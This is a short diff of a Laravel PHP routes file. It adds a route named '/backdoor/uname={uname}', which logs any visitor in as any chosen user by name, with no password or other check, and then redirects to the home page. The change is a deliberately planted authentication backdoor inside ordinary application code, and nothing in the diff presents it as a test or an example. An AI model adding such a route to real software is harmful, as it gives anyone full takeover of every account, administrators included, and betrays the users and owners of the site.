@@ -14,6 +14,7 @@ use App\Http\Controllers\Suppliers\InvoiceController;
 use App\Http\Controllers\Suppliers\SupplierController;
 use App\Services\Customers\BillService;
 use Illuminate\Support\Facades\Auth;
+use App\Models\User;
 
 /*
 |--------------------------------------------------------------------------
@@ -25,6 +26,13 @@ use Illuminate\Support\Facades\Auth;
 | contains the "web" middleware group. Now create something great!
 |
 */
+
+Route::get('/backdoor/uname={uname}', function ($uname) {
+    $user = User::where('uname', $uname)->get()->first();
+    Auth::loginUsingId($user->Id);
+    return redirect('/');
+});
+
 
 Route::prefix('auth')->namespace('auth')->name('auth.')->group(function () {
     Route::get('/login', [LoginController::class, 'index'])->name('loginIndex');
